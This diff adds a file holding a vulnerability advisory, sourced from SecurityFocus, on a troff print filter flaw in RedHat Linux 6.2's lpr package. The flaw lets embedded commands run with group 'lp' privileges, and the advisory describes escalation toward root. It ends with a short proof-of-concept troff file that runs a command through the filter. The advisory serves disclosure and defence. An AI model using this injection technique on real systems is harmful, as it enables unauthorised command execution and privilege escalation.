@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/1834/info
+
+lpr is a set of printing tools for unix systems. The lpr package that ships with RedHat Linux 6.2 (and possibly earlier versions) contains a vulnerability that will allow an attacker to execute arbitrary commands with the privileges of group 'lp'. 
+
+The vulnerability is not in one of the binary executables, rather in one of the print filters supplied with the lpr package. It is in the processing of troff files, their conversion into postscript files for printing on a postscript printer. 
+
+When the processing occurs, certain commands embedded in the troff file being processed can be executed -- with the privileges of the setgid lpr. This is the result of formatting programs being executed by the print filter in an unsafe manner.
+
+Compromise of group lp access may lead to further compromise as the lpr configuration files are writeable to members of group lp. If lpr configuration files are modified, arbitrary commands can be run as any user other than root. This will most certainly eventually lead to root access for the attacker (a excellent example of this is in the zenith parsec's bugtraq post in the reference section).
+
+[zen@continuity /tmp]$ cat asdf
+PS
+sh D/usr/bin/id>/tmp/yougetanyideasyetD
+.PF
+
+[zen@continuity /tmp]$ lpr asdf
+
+[zen@continuity /tmp]$ cat /tmp/yougetanyideasyet
+
+uid=500(zen) gid=500(zen) groups=7(lp)
